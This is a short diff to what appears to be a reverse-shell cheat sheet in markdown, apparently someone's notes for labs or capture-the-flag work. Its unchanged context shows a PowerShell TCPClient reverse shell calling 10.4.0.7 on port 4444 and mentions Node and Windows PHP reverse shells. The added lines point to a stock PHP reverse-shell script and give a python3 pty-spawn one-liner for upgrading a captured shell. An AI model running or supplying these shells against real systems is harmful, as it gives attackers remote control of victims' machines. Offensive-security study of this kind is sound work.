@@ -45,6 +45,8 @@ Node reverse shell, if you can get this included on a nodejs server:
 })();
 ```
 
+PHP reverse shell: use the php-reverse-shell.php by test monkey (on most attack boxes somewhere like `/usr/share/webshells/php`) - needs its ip and port updated
+
 PHP reverse shell on windows:
 
 ```php
@@ -78,6 +80,10 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.0.7',4444
 making a bad reverse shell better:
 
 `python -c 'import pty; pty.spawn("/bin/bash")'`
+
+also if python3 is required:
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
 if the shell is doing that weird echoing thing, then after running the above, the following can fix this:
 
